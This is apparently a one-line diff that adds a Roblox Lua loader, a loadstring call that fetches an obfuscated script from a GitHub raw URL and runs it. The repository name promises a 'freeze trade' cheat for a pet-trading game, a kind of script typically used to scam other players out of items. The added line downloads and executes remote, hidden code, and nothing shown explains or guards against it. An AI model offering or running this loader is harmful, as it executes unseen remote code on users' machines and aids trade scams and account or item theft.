@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/robloxscriptergodz/PET-S-GO-FREEZE-TRADE-SCRIPT-/refs/heads/main/obfuscated.txt"))()
